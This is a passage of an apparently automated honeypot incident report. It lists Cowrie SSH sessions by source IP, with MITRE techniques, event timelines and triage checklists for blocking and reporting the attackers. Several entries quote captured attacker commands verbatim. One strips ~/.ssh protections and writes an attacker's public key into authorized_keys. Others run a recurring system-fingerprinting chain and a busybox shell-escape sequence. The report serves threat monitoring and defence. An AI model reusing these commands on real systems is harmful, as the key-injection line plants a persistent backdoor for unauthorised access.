| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.command.input` |
| `2026-09-11 03:21:38` | `cowrie.log.closed` |
| `2026-09-11 03:21:39` | `cowrie.session.params` |
| `2026-09-11 03:21:39` | `cowrie.command.input` |
| `2026-09-11 03:21:40` | `cowrie.log.closed` |
| `2026-09-11 03:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef3ab8e4963b

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-09-11 03:22 |
| **Last Seen** | 2026-09-11 03:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:22:52` | `cowrie.session.connect` |
| `2026-09-11 03:22:52` | `cowrie.client.version` |
| `2026-09-11 03:22:52` | `cowrie.client.kex` |
| `2026-09-11 03:22:52` | `cowrie.login.success` |
| `2026-09-11 03:22:53` | `cowrie.session.params` |
| `2026-09-11 03:22:53` | `cowrie.command.input` |
| `2026-09-11 03:22:53` | `cowrie.command.failed` |
| `2026-09-11 03:22:53` | `cowrie.log.closed` |
| `2026-09-11 03:22:54` | `cowrie.session.params` |
| `2026-09-11 03:22:54` | `cowrie.command.input` |
| `2026-09-11 03:22:54` | `cowrie.session.file_download` |
| `2026-09-11 03:22:54` | `cowrie.log.closed` |
| `2026-09-11 03:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ad7f5ced64

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-09-11 03:22 |
| **Last Seen** | 2026-09-11 03:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:22:54` | `cowrie.session.connect` |
| `2026-09-11 03:22:54` | `cowrie.client.version` |
| `2026-09-11 03:22:54` | `cowrie.client.kex` |
| `2026-09-11 03:22:55` | `cowrie.login.success` |
| `2026-09-11 03:22:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc7e26d86ad8

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-09-11 03:22 |
| **Last Seen** | 2026-09-11 03:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:22:55` | `cowrie.session.connect` |
| `2026-09-11 03:22:55` | `cowrie.client.version` |
| `2026-09-11 03:22:55` | `cowrie.client.kex` |
| `2026-09-11 03:22:55` | `cowrie.login.success` |
| `2026-09-11 03:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00b2686b9f1e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:24 |
| **Last Seen** | 2026-09-11 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:24:28` | `cowrie.session.connect` |
| `2026-09-11 03:24:28` | `cowrie.client.version` |
| `2026-09-11 03:24:29` | `cowrie.client.kex` |
| `2026-09-11 03:24:29` | `cowrie.login.success` |
| `2026-09-11 03:24:30` | `cowrie.session.params` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.success` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.command.input` |
| `2026-09-11 03:24:30` | `cowrie.log.closed` |
| `2026-09-11 03:24:31` | `cowrie.session.params` |
| `2026-09-11 03:24:31` | `cowrie.command.input` |
| `2026-09-11 03:24:31` | `cowrie.log.closed` |
| `2026-09-11 03:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d108f73cb6ed

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:27 |
| **Last Seen** | 2026-09-11 03:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:27:13` | `cowrie.session.connect` |
| `2026-09-11 03:27:13` | `cowrie.client.version` |
| `2026-09-11 03:27:13` | `cowrie.client.kex` |
| `2026-09-11 03:27:14` | `cowrie.login.success` |
| `2026-09-11 03:27:15` | `cowrie.session.params` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.success` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.command.input` |
| `2026-09-11 03:27:15` | `cowrie.log.closed` |
| `2026-09-11 03:27:16` | `cowrie.session.params` |
| `2026-09-11 03:27:16` | `cowrie.command.input` |
| `2026-09-11 03:27:16` | `cowrie.log.closed` |
| `2026-09-11 03:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1654711dad0d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:29 |
| **Last Seen** | 2026-09-11 03:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:29:59` | `cowrie.session.connect` |
| `2026-09-11 03:29:59` | `cowrie.client.version` |
| `2026-09-11 03:30:00` | `cowrie.client.kex` |
| `2026-09-11 03:30:01` | `cowrie.login.success` |
| `2026-09-11 03:30:01` | `cowrie.session.params` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.success` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:01` | `cowrie.command.input` |
| `2026-09-11 03:30:02` | `cowrie.log.closed` |
| `2026-09-11 03:30:03` | `cowrie.session.params` |
| `2026-09-11 03:30:03` | `cowrie.command.input` |
| `2026-09-11 03:30:03` | `cowrie.log.closed` |
| `2026-09-11 03:30:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb52c654a06

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-11 03:34 |
| **Last Seen** | 2026-09-11 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:34:02` | `cowrie.session.connect` |
| `2026-09-11 03:34:02` | `cowrie.client.version` |
| `2026-09-11 03:34:02` | `cowrie.client.kex` |
| `2026-09-11 03:34:02` | `cowrie.login.success` |
| `2026-09-11 03:34:03` | `cowrie.direct-tcpip.request` |
| `2026-09-11 03:34:03` | `cowrie.direct-tcpip.data` |
| `2026-09-11 03:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83438d71fb7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:34 |
| **Last Seen** | 2026-09-11 03:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:34:43` | `cowrie.session.connect` |
| `2026-09-11 03:34:43` | `cowrie.client.version` |
| `2026-09-11 03:34:43` | `cowrie.client.kex` |
| `2026-09-11 03:34:43` | `cowrie.login.success` |
| `2026-09-11 03:34:45` | `cowrie.session.params` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.success` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.command.input` |
| `2026-09-11 03:34:45` | `cowrie.log.closed` |
| `2026-09-11 03:34:46` | `cowrie.session.params` |
| `2026-09-11 03:34:46` | `cowrie.command.input` |
| `2026-09-11 03:34:46` | `cowrie.log.closed` |
| `2026-09-11 03:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d905bd5cf4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:37 |
| **Last Seen** | 2026-09-11 03:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:37:27` | `cowrie.session.connect` |
| `2026-09-11 03:37:27` | `cowrie.client.version` |
| `2026-09-11 03:37:27` | `cowrie.client.kex` |
| `2026-09-11 03:37:28` | `cowrie.login.success` |
| `2026-09-11 03:37:29` | `cowrie.session.params` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.success` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.command.input` |
| `2026-09-11 03:37:29` | `cowrie.log.closed` |
| `2026-09-11 03:37:30` | `cowrie.session.params` |
| `2026-09-11 03:37:30` | `cowrie.command.input` |
| `2026-09-11 03:37:30` | `cowrie.log.closed` |
| `2026-09-11 03:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933f5ad36ec1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:40 |
| **Last Seen** | 2026-09-11 03:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:40:29` | `cowrie.session.connect` |
| `2026-09-11 03:40:29` | `cowrie.client.version` |
| `2026-09-11 03:40:29` | `cowrie.client.kex` |
| `2026-09-11 03:40:30` | `cowrie.login.success` |
| `2026-09-11 03:40:31` | `cowrie.session.params` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.success` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:31` | `cowrie.command.input` |
| `2026-09-11 03:40:32` | `cowrie.log.closed` |
| `2026-09-11 03:40:33` | `cowrie.session.params` |
| `2026-09-11 03:40:33` | `cowrie.command.input` |
| `2026-09-11 03:40:33` | `cowrie.log.closed` |
| `2026-09-11 03:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba666d92c6ca

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-11 03:41 |
| **Last Seen** | 2026-09-11 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:41:12` | `cowrie.session.connect` |
| `2026-09-11 03:41:12` | `cowrie.client.version` |
| `2026-09-11 03:41:12` | `cowrie.client.kex` |
| `2026-09-11 03:41:12` | `cowrie.login.success` |
| `2026-09-11 03:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0846085c145

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-11 03:41 |
| **Last Seen** | 2026-09-11 03:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:41:14` | `cowrie.session.connect` |
| `2026-09-11 03:41:14` | `cowrie.client.version` |
| `2026-09-11 03:41:14` | `cowrie.client.kex` |
| `2026-09-11 03:41:14` | `cowrie.login.success` |
| `2026-09-11 03:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e37dc1202208

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:42 |
| **Last Seen** | 2026-09-11 03:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:42:56` | `cowrie.session.connect` |
| `2026-09-11 03:42:56` | `cowrie.client.version` |
| `2026-09-11 03:42:56` | `cowrie.client.kex` |
| `2026-09-11 03:42:58` | `cowrie.login.success` |
| `2026-09-11 03:42:59` | `cowrie.session.params` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.success` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.command.input` |
| `2026-09-11 03:42:59` | `cowrie.log.closed` |
| `2026-09-11 03:43:00` | `cowrie.session.params` |
| `2026-09-11 03:43:00` | `cowrie.command.input` |
| `2026-09-11 03:43:00` | `cowrie.log.closed` |
| `2026-09-11 03:43:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7239bae0002

| Field | Detail |
|---|---|
| **Source IP** | `185.134.231[.]98` |
| **First Seen** | 2026-09-11 03:43 |
| **Last Seen** | 2026-09-11 03:44 |
| **Session Duration** | 74s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, /bin/busybox TOKEN` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:43:20` | `cowrie.session.connect` |
| `2026-09-11 03:43:24` | `cowrie.login.success` |
| `2026-09-11 03:43:25` | `cowrie.session.params` |
| `2026-09-11 03:43:25` | `cowrie.command.input` |
| `2026-09-11 03:43:25` | `cowrie.command.failed` |
| `2026-09-11 03:43:27` | `cowrie.command.input` |
| `2026-09-11 03:43:27` | `cowrie.command.failed` |
| `2026-09-11 03:43:28` | `cowrie.command.input` |
| `2026-09-11 03:43:28` | `cowrie.command.failed` |
| `2026-09-11 03:43:30` | `cowrie.command.input` |
| `2026-09-11 03:43:32` | `cowrie.command.input` |
| `2026-09-11 03:43:32` | `cowrie.command.input` |
| `2026-09-11 03:43:32` | `cowrie.command.success` |
| `2026-09-11 03:43:42` | `cowrie.session.file_download.failed` |
| `2026-09-11 03:43:52` | `cowrie.session.file_download.failed` |
| `2026-09-11 03:44:34` | `cowrie.log.closed` |
| `2026-09-11 03:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.134.231[.]98` to AbuseIPDB if not already reported
- [ ] Block `185.134.231[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d4b3845d199

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-11 03:45 |
| **Last Seen** | 2026-09-11 03:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-11 03:45:16` | `cowrie.session.connect` |
| `2026-09-11 03:45:16` | `cowrie.client.version` |
| `2026-09-11 03:45:16` | `cowrie.client.kex` |
| `2026-09-11 03:45:18` | `cowrie.login.success` |
| `2026-09-11 03:45:19` | `cowrie.session.params` |
